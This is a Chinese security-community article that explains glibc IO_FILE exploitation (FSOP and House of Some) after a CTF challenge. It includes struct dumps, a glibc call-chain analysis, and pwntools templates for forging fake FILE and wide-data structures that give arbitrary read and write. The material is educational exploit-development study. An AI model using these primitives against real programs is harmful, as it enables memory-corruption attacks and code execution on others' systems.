# 关于高版本glibc通过IO_FILE的任意地址读写-先知社区

> **来源**: https://xz.aliyun.com/news/19290  
> **文章ID**: 19290

---

本文为2025强网杯结束后以bph题目为开始进行的学习，主要详细介绍了利用FSOP进行任意地址写的调用过程与使用方法

## IO\_FILE结构及`stdin`、`stdout`举例

### `_IO_FILE_plus`

```
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```

### `_IO_FILE`

```
struct _IO_FILE
{
  int _flags;       /* 高 16 位为 _IO_MAGIC；其余为标志位。 */

  /* 以下指针与 C++ 的 streambuf 协议对应。 */
  char *_IO_read_ptr;   /* 当前读取指针 */
  char *_IO_read_end;   /* 获取区结束位置 */
  char *_IO_read_base;  /* 回退+获取区起始位置 */
  char *_IO_write_base; /* 写入区起始位置 */
  char *_IO_write_ptr;  /* 当前写入指针 */
  char *_IO_write_end;  /* 写入区结束位置 */
  char *_IO_buf_base;   /* 缓冲区起始位置 */
  char *_IO_buf_end;    /* 缓冲区结束位置 */

  /* 以下字段用于支持“回退”与“撤销”操作。 */
  char *_IO_save_base;   /* 非当前获取区起始指针 */
  char *_IO_backup_base; /* 备份区中第一个有效字符的指针 */
  char *_IO_save_end;    /* 非当前获取区结束指针 */

  struct _IO_marker *_markers; /* 标记链表 */
  struct _IO_FILE *_chain;     /* 文件链表指针 */

  int _fileno;   /* 文件描述符 */
  int _flags2;   /* 扩展标志 */
  __off_t _old_offset; /* 原 _offset 字段，因空间不足被替换。 */

  /* pbase() 的列号（从 1 开始）；0 表示未知。 */
  unsigned short _cur_column;
  signed char _vtable_offset; /* 虚表偏移 */
  char _shortbuf[1];          /* 短缓冲 */

  _IO_lock_t *_lock; /* 线程锁 */

#ifdef _IO_USE_OLD_IO_FILE
};

/* 完整版 FILE 结构（当使用新 ABI 时） */
struct _IO_FILE_complete
{
  struct _IO_FILE _file; /* 继承基础部分 */
#endif

  __off64_t _offset;          /* 64-bit 文件偏移 */
  /* 宽字符流相关。 */
  struct _IO_codecvt *_codecvt;   /* 编码转换表 */
  struct _IO_wide_data *_wide_data; /* 宽字符缓冲区 */
  struct _IO_FILE *_freeres_list; /* 空闲链表 */
  void *_freeres_buf;             /* 空闲缓冲 */
  size_t __pad5;                  /* 对齐填充 */
  int _mode;                      /* 宽/字节模式 */

  /* 防止再次出现内存布局问题。 */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

### `_IO_jump_t`

```
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

### `_IO_wide_data`

```
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* 当前读取指针 */
  wchar_t *_IO_read_end;    /* 获取区域结束位置 */
  wchar_t *_IO_read_base;   /* 回退+获取区域起始位置 */
  wchar_t *_IO_write_base;  /* 写入区域起始位置 */
  wchar_t *_IO_write_ptr;   /* 当前写入指针 */
  wchar_t *_IO_write_end;   /* 写入区域结束位置 */
  wchar_t *_IO_buf_base;    /* 缓冲区起始位置 */
  wchar_t *_IO_buf_end;     /* 缓冲区结束位置 */

  /* 以下字段用于支持回退与撤销操作 */
  wchar_t *_IO_save_base;   /* 非当前获取区域起始指针 */
  wchar_t *_IO_backup_base; /* 备份区域中第一个有效字符的指针 */
  wchar_t *_IO_save_end;    /* 非当前获取区域结束指针 */

  __mbstate_t _IO_state;      /* 当前多字节转换状态 */
  __mbstate_t _IO_last_state; /* 上次多字节转换状态 */
  struct _IO_codecvt _codecvt; /* 编码转换相关数据 */

  wchar_t _shortbuf[1];              /* 短缓冲区 */
  const struct _IO_jump_t *_wide_vtable; /* 宽字符版本的虚表指针 */
};
/* 长度为 0xe8 或为了对齐长度为 0xf0  */
```

### `IO_2_1_stdin`

```
pwndbg> p _IO_2_1_stdin_
$1 = {
  file = {
    _flags = -72540021,
    _IO_read_ptr = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_read_end = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_read_base = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_write_base = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_write_ptr = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_write_end = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_buf_base = 0x75b77e603963 <_IO_2_1_stdin_+131> "",
    _IO_buf_end = 0x75b77e603964 <_IO_2_1_stdin_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x75b77e605720 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x75b77e6039c0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x75b77e602030 <_IO_file_jumps>
}
                                        _flags              _IO_read_ptr
0x75b77e6038e0 <_IO_2_1_stdin_>:	    0x00000000fbad208b	0x000075b77e603963
                                        _IO_read_end        _IO_read_base
0x75b77e6038f0 <_IO_2_1_stdin_+16>:	    0x000075b77e603963	0x000075b77e603963
                                        _IO_write_base      _IO_write_ptr
0x75b77e603900 <_IO_2_1_stdin_+32>:	    0x000075b77e603963	0x000075b77e603963
                                        _IO_write_end       _IO_buf_base*
0x75b77e603910 <_IO_2_1_stdin_+48>:	    0x000075b77e603963	0x000075b77e603963
                                        _IO_buf_end*        _IO_save_base
0x75b77e603920 <_IO_2_1_stdin_+64>:	    0x000075b77e603964	0x0000000000000000
                                        _IO_backup_base     _IO_save_end
0x75b77e603930 <_IO_2_1_stdin_+80>:	    0x0000000000000000	0x0000000000000000
                                        _markers            _chain
0x75b77e603940 <_IO_2_1_stdin_+96>:	    0x0000000000000000	0x0000000000000000
                                        _fileno + _flags2	_old_offset
0x75b77e603950 <_IO_2_1_stdin_+112>:	0x0000000000000000	0xffffffffffffffff
                    _cur_column + _vtable_offset + _shortbuf    _lock
0x75b77e603960 <_IO_2_1_stdin_+128>:	0x0000000000000000	0x000075b77e605720
                                        _offset             _codecvt
0x75b77e603970 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
                                        _wide_data          _freeres_list
0x75b77e603980 <_IO_2_1_stdin_+160>:	0x000075b77e6039c0	0x0000000000000000
                                        _freeres_buf        __pad5
0x75b77e603990 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
                                        _mode + _unused2    _unused2
0x75b77e6039a0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
                                        _unused2            vtable
0x75b77e6039b0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x000075b77e602030
总长度为0xe0
```

### `IO_2_1_stdout`

```
pwndbg> p _IO_2_1_stdout_
$4 = {
  file = {
    _flags = -72537977,
    _IO_read_ptr = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_read_end = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_read_base = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_write_base = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_write_ptr = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_write_end = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_buf_base = 0x75b77e604643 <_IO_2_1_stdout_+131> "
",
    _IO_buf_end = 0x75b77e604644 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x75b77e6038e0 <_IO_2_1_stdin_>,
    _fileno = 1,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "
",
    _lock = 0x75b77e605710 <_IO_stdfile_1_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x75b77e6037e0 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x75b77e602030 <_IO_file_jumps>
}

0x75b77e6045c0 <_IO_2_1_stdout_>:	    0x00000000fbad2887	0x000075b77e604643
0x75b77e6045d0 <_IO_2_1_stdout_+16>:	0x000075b77e604643	0x000075b77e604643
0x75b77e6045e0 <_IO_2_1_stdout_+32>:	0x000075b77e604643	0x000075b77e604643
0x75b77e6045f0 <_IO_2_1_stdout_+48>:	0x000075b77e604643	0x000075b77e604643
0x75b77e604600 <_IO_2_1_stdout_+64>:	0x000075b77e604644	0x0000000000000000
0x75b77e604610 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x75b77e604620 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x000075b77e6038e0
0x75b77e604630 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x75b77e604640 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x000075b77e605710
0x75b77e604650 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x75b77e604660 <_IO_2_1_stdout_+160>:	0x000075b77e6037e0	0x0000000000000000
0x75b77e604670 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x75b77e604680 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x75b77e604690 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x000075b77e602030
总长度为0xe0
```

## 利用覆盖`stdin`的`_IO_buf_base`低位一字节为'\x00'的任意地址写

数据从`stdin`（即标准输入）写入时，会先存储在`_IO_buf_base`指向的位置，当数据量很大时则会malloc一片内存用于存储数据。而我们将`_IO_buf_base`的低位字节置为`\x00`后，其恰好指向自身的`_IO_write_base`处，那么这也就意味着我们能覆盖从此处到`_IO_buf_end`处的一块空间，其中包含了`_IO_buf_base`和`_IO_buf_end`，这又意味着我们能够再次通过修改`_IO_buf_base`和`_IO_buf_end`达到再次任意地址写的目的。  
需要注意的是，此方法需要由如`fgets`等函数触发`stdin`的刷新才能实现。

## 任意地址读

### 使用

```
    fif_leak_stack = flat({
        0x00: 0x800 | 0x1000, # _flags
        0x20: _IO_write_base, # _IO_write_base 要泄露区域的起始地址
        0x28: _IO_write_ptr, # _IO_write_ptr 要泄露区域的结束地址
        0x68: _chain, # _chain
        0x70: _fileno, # _fileno
        0x88: _lock, # _lock 
        0xd8: vtable, # vtable
    }, filler = b"\x00")
```

### 原理

正常`_IO_flush_all`执行时调用每个`IO_FILE`中`vtable`的`overflow`，在`_IO_new_file_overflow`函数中会调用`_IO_do_write`将未输出完的数据输出

## 任意地址写

### 使用

```
    fake_io_to_read = flat({
        0x00: 0, # _flags 此处为0就好
        # 在进行写之前会将write_base、write_ptr、write_end、
        # read_base、read_ptr、read_end自动设置为buf_base与buf_end的值
        0x38: _IO_buf_base, # _IO_buf_base
        0x40: _IO_buf_end, # _IO_buf_end
        0x68: _chain, # _chain 进行FSOP的关键 
        0x70: 0, # _fileno 表示从0（标准输入）输入数据
        0x88: _lock, # _lock 程序运行时会调用此处的值，不可为0
        0xa0: _wide_data, # _wide_data 填下方fake_wide_data的地址
        0xc0: 2, # _mode 绕过检查
        0xd8: vtable, # vtable
    }, filler = b"\x00")
    
    fake_wide_data = flat({
        0x18: 0, # _IO_write_base
        0x20: 0xff, # _IO_write_ptr
        0xe0: _wide_vtable, # 此处可填_IO_file_jumps - 0x48
        #_wide_vtable 用于触发_IO_new_file_underflow 
    }, filler = b"\x00")
```

### 原理

#### 来源

<https://blog.csome.cc/p/house-of-some/>

#### 详细

查看`_IO_flush_all`

```
int
_IO_flush_all (void)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
       )
      && _IO_OVERFLOW (fp, EOF) == EOF) /* 此处调用_IO_OVERFLOW */
    result = EOF;

      _IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}
```

程序调用`_IO_flush_all`时，会调用`_IO_OVERFLOW`  
我们来追踪一下`_IO_OVERFLOW`  
首先是

```
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
```

查看`JUMP1`

```
JUMP1(__overflow, fp, EOF)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
```

查看`_IO_JUMPS_FUNC`，有两个形态，但由于我们没有offset，所以使用第二个

```
#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
                 + (THIS)->_vtable_offset)))
#else
# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
(_IO_JUMPS_FUNC(fp)->__overflow) (fp, EOF)
```

已知`IO_validate_vtable`是检查`vtable`地址是否合法，所以直接查看`_IO_JUMPS_FILE_plus`

```
#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
(_IO_JUMPS_FILE_plus(fp)->__overflow) (fp, EOF)
```

查看`_IO_CAST_FIELD_ACCESS`

```
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
                       + offsetof(TYPE, MEMBER)))
(_IO_CAST_FIELD_ACCESS (fp, struct _IO_FILE_plus, vtable)->__overflow) (fp, EPF)
```

简单查看后可以得到最后的调用是

```
fp->vtable->__overflow (fp, EOF)
```

结合`vtable`中的定义

```
JUMP_FIELD(_IO_overflow_t, __overflow);
```

可知其将调用`vtable`表中的`__overflow`函数，且其类型为`_IO_overflow_t`，具体调用的函数我们需要从虚表填充的数据中去查找

```
  /* _IO_file_jumps  */
  [IO_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_new_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
```

通过询问ai得知`JUMP_INIT`的第一个参数在宏展开后就会多俩下划线，最终名字会与`_IO_jump_t`中一致，但此处我们需要做出改变，如果继续按照原路线进行，则会进入正常的`overflow`阶段。那我们提前将此处的`_IO_file_jumps`地址改为`_IO_wfile_jumps`地址才能继续我们的攻击。  
*笔者在学习到这之前一直没理解为什么他能执行wfile的函数，原来是重点在更换的虚表地址*

```
  /* _IO_wfile_jumps  */
  [IO_WFILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_new_file_finish),
    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),
    JUMP_INIT (underflow, (_IO_underflow_t) _IO_wfile_underflow),
    JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
    JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
    JUMP_INIT (xsputn, _IO_wfile_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_wfile_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, (_IO_sync_t) _IO_wfile_sync),
    JUMP_INIT (doallocate, _IO_wfile_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
```

继续跟踪`_IO_wfile_overflow`函数

```
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
      || f->_wide_data->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
    {
      _IO_wdoallocbuf (f);
      _IO_free_wbackup_area (f);
      _IO_wsetg (f, f->_wide_data->_IO_buf_base,
             f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

      if (f->_IO_write_base == NULL)
        {
          _IO_doallocbuf (f);
          _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
        }
    }
      else
    {
      /* Otherwise must be currently reading.  If _IO_read_ptr
         (and hence also _IO_read_end) is at the buffer end,
         logically slide the buffer forwards one block (by setting
         the read pointers to all point at the beginning of the
         block).  This makes room for subsequent output.
         Otherwise, set the read pointers to _IO_read_end (leaving
         that alone, so it can continue to correspond to the
         external position). */
      if (f->_wide_data->_IO_read_ptr == f->_wide_data->_IO_buf_end)
        {
          f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
          f->_wide_data->_IO_read_end = f->_wide_data->_IO_read_ptr =
        f->_wide_data->_IO_buf_base;
        }
    }
      f->_wide_data->_IO_write_ptr = f->_wide_data->_IO_read_ptr;
      f->_wide_data->_IO_write_base = f->_wide_data->_IO_write_ptr;
      f->_wide_data->_IO_write_end = f->_wide_data->_IO_buf_end;
      f->_wide_data->_IO_read_base = f->_wide_data->_IO_read_ptr =
    f->_wide_data->_IO_read_end;

      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    f->_wide_data->_IO_write_end = f->_wide_data->_IO_write_ptr;
    }
  if (wch == WEOF)
    return _IO_do_flush (f);
  if (f->_wide_data->_IO_write_ptr == f->_wide_data->_IO_buf_end)
    /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  *f->_wide_data->_IO_write_ptr++ = wch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && wch == L'
'))
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  return wch;
}
```

发现其中调用的第一个函数`_IO_wdoallocbuf`，查看`_IO_wdoallocbuf`

```
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
             fp->_wide_data->_shortbuf + 1, 0);
}
```

终于见到关键调用了，其中有个`_IO_WDOALLOCATE`，此为一个宏

```
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
```

查看后就可发现其是通过虚表寻找函数调用的宏，从前面追溯`overflow`的过程我们可以举一反三，但是要注意在这一步有所不同，也是因为这一步我们能够进行攻击

```
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```

此处与前面不同之处为使用了`_wide_data`中的`_wide_vtable`。那么已知其寻找函数是通过`_wide_vtable`地址加上偏移，我们查看`vtable`的结构体可知`__doallocate`的偏移为`0x68`，通过适当改变存放`_wide_vtable`的地址的值也就可以执行`_wide_vtable`上的其它函数了。  
House of Some的提出者csome师傅发现了`_IO_new_file_underflow`这个函数中存在的`_IO_SYSREAD`可用于此处，执行写操作。  
而简单查找可发现`_IO_new_file_underflow`是

```
  /* _IO_file_jumps  */
  [IO_FILE_JUMPS] = {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_file_finish),
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_new_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },
```

表中的`_IO_file_underflow`的具体实现

```
versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);
```

查看`_IO_new_file_underflow`（有new肯定有old，但是old被注释了）

```
int
_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
    {
      free (fp->_IO_save_base);
      fp->_flags &= ~_IO_IN_BACKUP;
    }
      _IO_doallocbuf (fp);
    }

  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
     required by any standard.  My recollection is that
     traditional Unix systems did this for stdout.  stderr better
     not be line buffered.  So we do just that here
     explicitly.  --drepper */
      _IO_acquire_lock (stdout);

      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
      == (_IO_LINKED | _IO_LINE_BUF))
    _IO_OVERFLOW (stdout, EOF);

      _IO_release_lock (stdout);
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
               fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
    fp->_flags |= _IO_EOF_SEEN;
      else
    fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
     handles.  As a result, our offset cache would no longer be valid, so
     unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
```

那么我们只需让本该执行`_IO_wfile_doallocate`的地方执行`_IO_file_underflow`，就能实现任意地址写啦，**具体操作方法则是在**`_wide_data`**的**`_wide_vtable`**处填上**`_IO_file_jumps-0x48`**即可**。  
需要注意的是由于其中调用的`_IO_switch_to_get_mode`有

```
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_OVERFLOW (fp, EOF) == EOF)
      return EOF;
```

所以在`_IO_flush_all`的if中我们不能使用第一个条件，而该使用第二个和`_wide_data`有关的条件。以及由于调用的过程中使用了`_lock`，我们需要在伪造`IO_FILE`时填上`_lock`处的值。

### 总结

其完整的调用链为

* `_IO_flush_all`

* `_IO_OVERFLOW`

* `_IO_wfile_overflow`（修改fp->vtable导致）

* `_IO_wdoallocbuf`

* `_IO_WDOALLOCATE`

* `_IO_new_file_underflow`（修改`fp->_wide_data->_wide_vtable`导致）

* `_IO_SYSREAD`（成功任意地址读写）
